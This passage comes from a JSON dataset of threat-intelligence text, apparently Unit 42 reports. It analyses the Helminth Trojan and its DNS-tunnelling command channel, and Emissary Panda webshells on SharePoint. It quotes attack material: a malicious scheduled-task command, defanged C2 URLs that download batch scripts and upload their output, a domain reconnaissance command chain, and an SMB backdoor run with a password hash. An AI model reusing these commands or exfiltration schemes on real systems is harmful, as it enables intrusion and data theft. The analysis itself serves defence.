                "Examining the known infrastructure of the collected sample set of Helminth provides several interesting findings in regards to the adversarys tactics.",
                "The variants leveraging malicious macros embedded in Excel documents all share the same command and control server of go0gie[.]com.",
                "The executable variants, on the other hand, used a variety of domains:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "checkgoogle[.]org\nmydomain1110[.]com\nkernel[.]ws\nmydomain1607[.]com\nmydomain1609[.]com"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 Helminth C2 Infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Each sample of the weaponized Excel document variant used a unique command and control domain to retrieve a bot ID, using the following format:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "00000000<base 36 of a random number smaller than 46655>30.go0gie[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Each of these domains, however, resolved to the same IP address of 5.39.112.87.",
                "This IP is observed as the resolution for two domains in use by the portable executable variants, kernel[.]ws and mydomain1110[.]com.",
                "Judging by compile timestamps of the executables and last saved timestamps of the weaponized documents, it is likely the adversary is recycling a previously created C2 server at 5.39.112.87 for the newer macro based variant.",
                "The other C2 domains and IPs observed in use by the previous portable executable samples did not have shared infrastructure with the newer macro variants, although there is tactical overlap via the naming scheme of the domains."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Historical WHOIS data reveals additional findings, potentially alluding to an Iranian-based operator.",
                "From a timeline perspective, a new domain was registered almost in consecutive months, beginning in July 2015.",
                "Each of the domains's WHOIS data contained registrant information that was either reused, or was closely related to previously used information.",
                "For example, the domains mydomain1607[.]com and mydomain1609[.]com used the exact same registrant information.",
                "The email address edmundj@chmail[.]ir and the geolocation of Tehran, Iran, being of note.",
                "Kernel[.]ws and checkgoogle[.]org used very similar email addresses, andre_serkisian@yahoo[.]com and andre.serkisian@chmail[.]ir, respectively.",
                "The registrant information for kernel[.]ws also provided a geolocation of Tehran, IR and the email provider for the address used in checkgoogle[.]org was the same used for mydomain1607[.]com and mydomain1609[.]com, chmail.ir.",
                "The mydomain1110[.]com domain did not appear to reuse any of the previously observed WHOIS data artifacts, but did still give a geolocation of Tehran in addition to the use of an email address linked to other domains thematically similar to the know command and control domains and are potentially related."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although there is heavy use of Iranian-based artifacts within the WHOIS registrant information, it is important to remember that this data is easily falsified.",
                "At face value, however, taking into account the registrant information and the use of Persian language in the samples are compelling indicators that the operators may indeed be based out of Iran."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While researching the OilRig campaign, we have seen two waves of targeted attacks on Saudi Arabian organizations in which a group of threat actors delivered the Helminth Trojan as a payload.",
                "The two waves of attacks used separate variants of the Helminth Trojan, specifically a script and executable variant of the Trojan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The two variants of Helminth use almost identical command and control protocols, which allows the threat actors to maintain consistent infrastructure throughout the campaign to manage the compromised hosts, regardless of the Helminth variant used in the attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The two variants of Helminth do require different delivery methods, with the script variant relying on an Excel spreadsheet for delivery, while the executable variant is more traditional in the fact that it can be installed without a delivery document.",
                "We speculate that the executable variant involves threat actors socially engineering the victim into running the payload, rather than installing the payload as the result of successful exploitation of a vulnerability.",
                "The multiple delivery methods suggest this threat group is capable of adapting their procedures to suit the current operation in the overarching campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from the Helminth Trojan and can gather additional information using the following tools:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Clayslide Delivery Documents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At first, Clayslide spreadsheets display a worksheet called Incompatible that contains instructions for the user to manually enable macros (as seen in Figure 6), as macros are disabled in Excel by default.",
                "This is an attempt to trick the user into running the embedded macro to install the Trojan, which does not require any vulnerability exploitation.",
                "Figure 6 shows the Protected View alert in Excel informing the user that there is an embedded macro that may cause harm to the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Clayslide spreadsheet showing the Incompatible worksheet with instructions to enable macros and Excel displaying its Protected View alert message"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Before the user can enable the macros in accordance with the instructions displayed in the spreadsheet, the user must click the red bar displayed by Protected View and click the Edit Anyway button, as seen in 7."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7",
                "Protected View further mentioning the potential danger with editing the spreadsheet in the ClaySlide sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After clicking the Edit Anyway button, Excel displays another security warning bar alerting that the spreadsheet contains macros, as seen in Figure 8.",
                "The Enable Content button mentioned within the instructions displayed within the Clayslide spreadsheet is now presented to the user."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Excel security warning with the Enable Content button mentioned in Incompatible worksheet"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the user clicks the Enable Content button, the macro hides the Incompatible worksheet and makes hidden worksheets visible that displays decoy content to minimize the victims suspicions of malicious behavior taking place.",
                "Figure 9 below shows the decoy content displayed by macros within a Clayslide sample, specifically showing the status of internal network IP addresses that fit with the service provider social engineering theme used throughout the attack campaign.",
                "Figure 9 also shows that the Incompatible worksheet is no longer visible, as the decoy content is displayed in a worksheet called Sheet1."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 Decoy content displayed after enabling macros within a Clayslide sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After displaying the decoy content, the macro begins installing the script variant of the Helminth Trojan to the system.",
                "The process used by the macro to install this variant of Helminth begins with the creation of the following files and folders:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%PUBLIC%\\Libraries\\update.vbs\n%PUBLIC%\\Libraries\\dns.ps1\n%PUBLIC%\\Libraries\\up\n%PUBLIC%\\Libraries\\dn\n%PUBLIC%\\Libraries\\tp"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malicious macro finishes the installation process by creating a scheduled task that is responsible for running the two scripts at regular intervals, as the scripts themselves do not have the ability to continually run after the initial execution.",
                "The following code snippet within the macro creates a scheduled task named GoogleUpdateTaskMachineUI that will run the update.vbs script every three minutes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "wss.Run \"schtasks /create",
                "/F",
                "/sc minute /mo 3 /tn \" & Chr(34) & \"GoogleUpdateTaskMachineUI\" & Chr(34) & \" /tr \" & wss.ExpandEnvironmentStrings(\"%PUBLIC%\") & \"\\Libraries\\update.vbs\", 0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The script variant of the Helminth Trojan consists of a VBScript and PowerShell script named update.vbs and dns.ps1.",
                "We aptly named this variant the script version, as we found another version of this Trojan that we will discuss later in this Appendix.",
                "The update.vbs script is responsible for reaching out to its command and control (C2) server using HTTP requests to the following two URLs:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://go0gIe.com/sysupdate.aspx?req=<random number>%5Cdwn&m=d\nhxxp://go0gIe.com/sysupdate.aspx?req=<random number>%5Cbat&m=d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond to the HTTP requests to the bat&m=d URL with a batch script that update.vbs will save to the dn folder and execute.",
                "The output of the downloaded batch script is saved to a text file in the up folder and uploaded to the C2 server via an HTTP POST request to the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxp://go0gIe.com/sysupdate.aspx?req=<random number>%5Cupl&m=u"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks WildFire observed commands provided by the C2 server for the known Helminth samples.",
                "The commands, as seen below, show that the threat actors are attempting to do initial information gathering on the system, including available user accounts, username, computer name, running tasks, services, network services and if remote desktop is enabled."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group \"domain admins\" /domain 2>&1 & net group \"Exchange Trusted Subsystem\" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" 2>&1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The update.vbs concludes by running the dns.ps1 PowerShell script.",
                "The dns.ps1 script is also responsible for communicating with the C2 server, but it uses DNS queries to send data to the server.",
                "The DNS queries sent by this script are queries to subdomains on the same domain as the C2 server, which contains system information or the contents of files from the system.",
                "The subdomain of the DNS request that acts as the initial C2 beacon has the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "00000000<base 36 of a random number smaller than 46655>30"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dns.ps1 script checks the response to this DNS query and uses the first octet of the resolving IP address as an identifier for the compromised system.",
                "The script then uses this identifier in a follow up DNS request to a subdomain with the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "00<identifier>00000<base36 of a random number smaller than 46655>30"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C2 server will respond to these DNS queries with IP addresses that the script will parse and eventually treat as data to construct a batch script to execute on the system.",
                "The script specifically looks for the IP address 33.33.x.x to mark the beginning of the batch script transfer.",
                "Upon receipt of this IP address, the script uses the last two octets of this IP address as a filename for the batch file that it saves to the tp folder that was initially created by the macro.",
                "Once the batch file name is obtained, the script will continue sending additional DNS requests and use the octets of the resolving IP addresses as characters to write to the batch script.",
                "The script continues writing characters to the batch script until it receives the IP address 35.35.35.35 that notifies the script to stop saving data to the file and to run the batch script."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The output of the downloaded batch file is saved to %PUBLIC%\\Libraries\\tp\\<batch filename>.txt.",
                "The script will then upload the output of this batch file by including the data in a sequence of DNS queries.",
                "The exfiltrates the output of the batch script by splitting up the data within the text file into chunks up to 23 bytes and sends the data within a series of DNS queries that have the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "00",
                "<identifier><filename of batch file without its extension><base36 of sequence number><base36 of a random number smaller than 46655><up to 23 bytes of data from batch script output>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both the update.vbs and dns.ps1 both provide a fully functional remote shell to the actors, which allow the actor to carry out any activities on the compromised system they wish."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The executable variant of Helminth is installed with a Trojan that we are tracking as the HerHer Trojan.",
                "The HerHer Trojan saves several files to the file system upon execution to install the Helminth Trojan to the system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Certificate Managment.lnk shortcut uses the Certificate.ico file for its icon, as seen in Figure 10."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 10 Icon file used"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, it has a comment of herher, which is basis of the droppers name.",
                "Helminth relies on the following shortcut for persistence, as it runs the Trojan each time the system starts using the following command line:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\"C:\\Users\\Rick James\\AppData\\Roaming\\Microsoft Temperary\\adbmanager.exe\" q 1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The adbmanager.exe and adbtray.exe files are the actual Helminth Trojan, both of which are the same executable.",
                "The reason for two different filenames is currently unknown.",
                "The Helminth Trojan requires arguments on the command-line to execute properly (q in the analyzed sample as seen in the Certificate Managment.lnk shortcut), one of which will run the Trojans functional code and the other can open a dialog box as a decoy."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Helminth Trojan begins by creating a mutex named [username]ver4.1 and writes its embedded configuration as ciphertext to the following file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%APPDATA%\\Local\\Temp\\acro\\Users\\config.txt"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will later decrypt the contents of this file using the RC4 algorithm, using the MD5 hash of f246b23d-c2d6-45f2-b268-dec30d9adaad as the key.",
                "We decrypted the configuration file dropped by Helminth and found the structure of the configuration file is IsAlive,[sleep interval]\\r\\n[C2 domain].",
                "For example, one Helminth sample had the following data within the config.txt file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IsAlive,30\ncheckgoogle.org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Helminth executable variant is able to run batch scripts provided by the C2 server, which is very similar to the script version of this Trojan.",
                "The executable variant has one additional capability that is not present in the script version, which involves the ability to log keystrokes via a supplemental keylogger module."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Helminth loads its keylogger module of the Trojan by loading the wintrust.hlm file dropped by the HerHer Trojan as a DLL and calling its exported function named Initialize.",
                "The keylogger that creates a window named kk to monitor both the clipboard and keystrokes and to save the data in cleartext to the file %TEMP%/acro/Users/[GUID from CoCreateGuid]kk.tmp.",
                "The keylogger saves the keystrokes and the name of the Window visible while the keys were typed to this file in the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "####",
                "T####[Window Name]####ET####\n[logged keystrokes]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The wintrust.hlm keylogger logs the contents of the clipboard to the same file, but the clipboard contents do not follow a header that specifies the window name like the other logged keystrokes.",
                "The clipboard contents are logged to the file in the following format:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<<< Clipboard ---> [contents of clipboard]>>>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Helminth executable is able to communicate with its C2 server via HTTP and via DNS queries in very similar ways to the Helminth script variant.",
                "In fact, the DNS beacons follow the same structure and sequence as the script variant of Helminth discussed in the previous section.",
                "The main difference between the beacons sent from the two variants of Helminth is the data included within the beacon, as the script variant does not send any system information within the beacons, whereas the executable version sends system and malware specific information within both the HTTP and DNS beacons."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Helminth executables include the system and malware information within HTTP beacons in the Cookie field of the request.",
                "Helminth structures the beacon data as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Function=F1; ID=[MD5 of Computer and Username]; Group=[Hardcoded in Malware]; Name=[Hardcoded in Malware]; Service=0;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will encrypt this data using RC4 and the MD5 hash of f246b23d-c2d6-45f2-b268-dec30d9adaad as the key and encode the encrypted data using base64.",
                "Figure 11 shows a Helminth HTTP beacon with the Cookie field containing the base64 data."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 11 Helminth HTTP C2 beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Helminth sends data within DNS beacons differently than the HTTP beacons and includes additional information as well.",
                "The data within the DNS beacons follows the structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<path of folder containing keylogger module>\n<path of folder containing key logs and batch script output files>\n<group name hardcoded in malware>\n<name hardcoded in malware>\n<computer name>\n<user name>\n<sleep interval>\n<C2 domain>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan does not encrypt the data sent via DNS beacons, rather it converts the ASCII characters into their hexadecimal values and includes these values in cleartext.",
                "The DNS beacons sent from the Helminth executable have the following structure, which is very similar to the script version:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "00",
                "<identifier>01<sequence number><up to 24 hexadecimal values of the ASCII data>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12 shows an example of the DNS beacons sent from a Helminth executable."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12 Helminth DNS C2 beacon"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The encoded data within the DNS beacons displayed in Figure 12 decode to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\Users\\Public\\Libraries\\~Windows\\\nC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Users\\\n[redacted company name]\nPlato\n[Computer Name redacted]\nAdministrator\n30\nkernel.ws"
            ]
        }
    ],
    "f83514533bae725b5982044a40e6c8d885cb2954": [
        {
            "type": "paragraph",
            "content": [
                "Executive Summary"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In April 2019, Unit 42 observed the Emissary Panda (AKA APT27, TG-3390, Bronze Union, Lucky Mouse) threat group installing webshells on SharePoint servers to compromise Government Organizations of two different countries in the Middle East.",
                "We believe the adversary exploited a recently patched vulnerability in Microsoft SharePoint tracked by CVE-2019-0604, which is a remote code execution vulnerability used to compromise the server and eventually install a webshell.",
                "The actors uploaded a variety of tools that they used to perform additional activities on the compromised network, such as dumping credentials, as well as locating and pivoting to additional systems on the network.",
                "Of particular note is their use of tools to identify systems vulnerable to CVE-2017-0144, which is the same vulnerability exploited by EternalBlue that is best known for its use in the WannaCry attacks of 2017."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This activity appears related to campaigns exploiting CVE-2019-0604 mentioned in recent security alerts from Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",
                "In addition to the aforementioned post-exploitation tools, the actors used these webshells to upload legitimate executables that they would use DLL sideloading to run a malicious DLL that has code overlaps with known Emissary Panda attacks.",
                "We also found the China Chopper webshell on the SharePoint servers, which has also been used by the Emissary Panda threat group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this blog, we provide details of the tools and tactics we observed on these compromised SharePoint servers, explain how we believe these connect to the Emissary Panda threat group, correlate our findings with those of the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security, and provide indicators of compromise (IoCs) from our research.",
                "You can find the Adversary Playbook for the activity detailed in this blog here."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Attack Overview"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This webshell activity took place across three SharePoint servers hosted by two different government organizations between April 1, 2019 and April 16, 2019, where actors uploaded a total of 24 unique executables across the three SharePoint servers.",
                "Figure 1 shows a timeline of when the files were uploaded to the three webshells.",
                "The timeline shows three main clusters of activity across the three webshells, with activity occurring on two separate webshells (green and orange) within a very small window of time on April 2, 2019 and the activity involving the third webshell two weeks later on April 16, 2019.",
                "The actors uploaded several of the same tools to across these three webshells, which provides a relationship between the incidents and indicates that a single threat group is likely involved."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Timeline of file uploads across three related webshells"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tools uploaded to the webshells range from legitimate applications such as cURL to post-exploitation tools such as Mimikatz.",
                "The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in MS17-010 commonly exploited by EternalBlue to move laterally to other systems on the network.",
                "We also observed the actors uploading custom backdoors such as HyperBro which is commonly associated with Emissary Panda.",
                "Based on the functionality of the various tools uploaded to the webshells, we believe the threat actors breach the SharePoint servers to use as a beachhead, then attempt to move laterally across the network via stolen credentials and exploiting vulnerabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Webshells Installed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As previously mentioned, we found webshells installed on three SharePoint servers hosted at two different organizations, two of which had the same file name of errr.aspx and the other a filename of error2.aspx.",
                "The webshells were hosted at the following paths on the compromised servers:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "/_layouts/15/error2.aspx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "/_layouts/15/errr.aspx"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We were able to gather one of the webshells with which we saw the actor interacting, specifically the error2.aspx file listed above.",
                "The error2.aspx file (SHA256: 006569f0a7e501e58fe15a4323eedc08f9865239131b28dc5f95f750b4767b38) is a variant of the Antak webshell, which is part of a tool created for red teaming called Nishang.",
                "The specific variant of Antak in error2.aspx is version v0.5.0, which is an older version of the webshell that was updated in August 2015 to v0.7.6 to include some basic authentication functionality and the ability to perform SQL queries.",
                "Its possible the actors obtained Antak v0.5.0 via the Nishang GitHub repository or from SecWikis GitHub that also has the v0.5.0 version of Antak.",
                "Figure 2 shows the Antak webshell loaded on one of the Sharepoint servers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. Antak webshell error2.aspx used to upload post-exploitation tools"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While we observed the threat actor uploading additional tools to the Antak webshell above, the Sharepoint server also had several other webshells installed.",
                "The additional webshells, specifically stylecs.aspx, stylecss.aspx, and test.aspx are listed in Table 1, and appear related to the China Chopper webshell.",
                "We cannot be sure all of these webshells were installed by the same actors, as multiple actors could have exploited the SharePoint server.",
                "For instance, the China Chopper-related webshells are one-line of JScript code that could be easily copied and used by multiple groups, and the Antak webshell is easily obtained from publicly accessible repositories.",
                "However, the installation of China Chopper and the uploading of Emissary Panda related custom payloads to the Antak webshell suggests they are likely related, as this threat group has used China Chopper to compromise servers in the past."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Additional webshells hosted on Sharepoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request.",
                "Figure 3 shows this webshells code that will run supplied JScript provided in base64 encoded format within the URL within a parameter e358efa489f58062f10dd7316b65649e.",
                "The parameter e358efa489f58062f10dd7316b65649e is interesting as it is the MD5 hash for the letter t, which is a known parameter for China Chopper as mentioned in the next section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. China Chopper code found in stylecs.aspx webshell on SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The stylecss.aspx webshell is very similar to the stylecs.aspx, as it runs JScript provided within the e358efa489f58062f10dd7316b65649e parameter of the URL; however, the stylecss.aspx webshell does not accept base64 encoded JScript, but expects the JScript in cleartext that the actor would provide as URL safe text.",
                "Figure 4 shows the code within stylecss.aspx, which when compared to Figure 3 above shows the lack of the base64 decoding function FromBase64String."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. China Chopper code found in stylecss.aspx webshell on SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The last webshell extracted from the Sharepoint server had a filename of test.aspx, which is very similar to the stylecs.aspx webshell as it runs base64 encoded JScript provided in the URL of the request.",
                "However, the test.aspx webshell uses a parameter related to the compromised organization to obtain the base64 encoded JScript that it will run and display within the browser.",
                "The test.aspx shell also includes code that sets the HTTP response status to a 404 Not Found, which will display an error page but will still run the provided JScript.",
                "Figure 5 shows the code within the test.aspx file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5.",
                "China Chopper code found in test.aspx webshell on SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Links to Security Advisories"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In April 2019, several national security organizations released alerts on CVE-2019-0604 exploitation, including the Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security.",
                "Both of these alerts discussed campaigns in which actors used the CVE-2019-0604 to exploit SharePoint servers to install the China Chopper webshell.",
                "While we cannot confirm all of the claims made in these advisories, we noticed overlaps in the webshell code hosted on the compromised SharePoint servers we observed and the webshells mentioned in these advisories."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Saudi Arabian National Cyber Security Centers alert provided details regarding the activities carried out by the adversary.",
                "This alert also displayed the code associated with the China Chopper webshell observed in the attacks, which included Request.Item[\"t",
                "\"] to obtain JScript code from the t parameter of the URL.",
                "As mentioned in the previous section, stylecs.aspx and stylecss.aspx both used a parameter of e358efa489f58062f10dd7316b65649e, which is the MD5 hash of t. This may suggest the actor modified the script slightly between the attack we observed, and the attack mentioned in the NCSC advisory, all while retaining the same functionality.",
                "Also, the NCSC advisory mentioned that the actors used a file name stylecss.aspx for their webshell, which is the same filename we saw associated with China Chopper."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The alert from the Canadian Center for Cyber Security included the SHA256 hashes of the files associated with the campaign, one of which was 05108ac3c3d708977f2d679bfa6d2eaf63b371e66428018a68efce4b6a45b4b4 for a file named pay.aspx.",
                "The pay.aspx file is part of the China Chopper webshell and is very similar to the stylecss.aspx webshell we discussed above, with the only major difference is the URL parameter of vuiHWNVJAEF within the URL that pay.aspx webshell uses to obtain and run JScript.",
                "Figure 6 below shows a comparison between the stylecss.aspx and pay.aspx files."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6.",
                "Comparison between stylecss.aspx webshell and pay.aspx webshell discussed in Canadian Center for Cyber Security advisory"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Tools Uploaded"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During our research into this attack campaign, Unit 42 gathered several tools that the actor uploaded to the three webshells at the two government organizations.",
                "The chart in Figure 7 shows the same tools being uploaded to the webshells, which provided an initial linkage between the activities.",
                "One of the overlapping tools uploaded to the webshells is the legitimate cURL application, which could be used by multiple groups.",
                "The other overlapping files are tools used by the adversary to locate other systems on the network (etool.exe), check to see if they are vulnerable to CVE-2017-0144 (EternalBlue) patched in MS07-010 (checker1.exe) and pivot to them using remote execution functionality offered by a tool similar to PsExec offered by Impacket (psexec.exe).",
                "These tools are not custom made by the adversary but still provide a medium confidence linkage between the activities.",
                "We also observed the actors uploading the HyperBro backdoor to one of the webshells, as well as legitimate executables that would sideload malicious DLLs that have overlapping code associated with known Emissary Panda activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7. Relationships between tools uploaded to the three webshells hosted on SharePoint servers"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The actors uploaded 10 portable executables to the error2.aspx webshell, as seen in Table 2.",
                "The list of tools uploaded to this webshell includes legitimate applications, such as cURL and a component of Sublime Text used to sideload a malicious DLL, which we will discuss in an upcoming section.",
                "The list also includes several hack tools, such as Mimikatz for credential dumping and several compiled python scripts used to locate and compromise other systems on the local network.",
                "Lastly, we saw the actor uploading a custom backdoor called HyperBro, which has been associated with Emissary Panda operations in the past.",
                "We will provide an analysis of the HyperBro tool in an upcoming section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Unique tools uploaded to the error2.aspx webshell installed on a SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We saw 17 tools uploaded to the errr.aspx webshell hosted on the SharePoint server of one of the government organizations, which is in the middle of the chart in Figure 7. Table 3 shows all of the tools we observed the actor uploading to the webshell, which includes a list of tools used to dump credentials, locate, and exploit remote systems, as well as pivoting to other systems on the network."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3. Unique tools uploaded to the errr.aspx webshell installed on a SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Two of the tools, specifically the compiled zzz_exploit.py and checker.py suggest the actor would check and exploit remote systems if they were not patched for MS17-010, which patched the CVE-2017-0144 (EternalBlue) vulnerability.",
                "Also, the use of the Mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems.",
                "We were able to gather the command line arguments the actor used to run the SMB backdoor smb1.exe.",
                "The following arguments shows the actor using the SMB backdoor to attempt to run a batch script m.bat on a remote host using a domain username and the accounts password hash:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c:\\programdata\\smb1.exe <redacted 10.0.0.0/8 IP> <redacted domain>\\<redacted username> :<redacted password hash> winsk c:\\programdata\\m.bat"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We saw far fewer portable executable files uploaded to the second errr.aspx webshell, specifically the 3 files seen in Table 4.",
                "The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.",
                "Also, we observed the actor uploading a legitimate Microsoft application that would sideload a malicious DLL, of which was very similar to the DLL sideloaded by the Sublime Text plugin host that was uploaded to the error2.aspx webshell."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4. Unique tools uploaded to the errr.aspx webshell installed on a SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Emissary Panda Specific Tools"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Many of the tools uploaded to these webshells are hacking tools that are publicly accessible and could be used by multiple threat actors.",
                "However, several of the tools uploaded to the webshells appear to be custom made and likely related to the Emissary Panda threat group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "HyperBro"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The s.exe (SHA256: 04f48ed27a83a57a971e73072ac5c769709306f2714022770fb364fd575fd462) uploaded to the error2.aspx webshell is a self-extracting 7-zip archive that is an example of the HyperBro backdoor.",
                "According to Kaspersky and SecureWorks research, HyperBro is a custom backdoor developed and used by Emissary Panda in their attack campaigns.",
                "This sample of HyperBro is similar to the sample discussed in Kasperskys research, specifically using a legitimate pcAnywhere application to sideload a DLL to decrypt, decompress and run a payload embedded within a file named thumb.db.",
                "Table 5 shows the three files associated with this HyperBro sample, which have the same file names as the self-extracting 7zip archives mentioned in Kasperskys blog (SHA256 hashes: 34a542356ac8a3f6e367c6827b728e18e905c71574b3813f163e043f70aa3bfa and 2144aa68c7b2a6e3511e482d6759895210cf60c67f14b9485a0236af925d8233)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 5. Files associated with the HyperBro tool uploaded to webshell on SharePoint server"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The functional payload is a DLL compiled on 2019-03-11 02:23:54, which has two functionalities depending if the binary has a command line argument -daemon or -worker passed to it.",
                "The daemon functionality handles the C2 communications portion of the Trojan, which is configured to communicate with 185.12.45[.]134 over HTTPS using the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "hxxps://185.12.45[.]134:443/ajax"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The worker functionality acts on the data received from the C2 server, which is passed from the daemon to the worker via a named pipe called \"\\\\.\\pipe\\testpipe\".",
                "The worker subjects the received data to a command handler whose available commands are listed in Table 6."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6.",
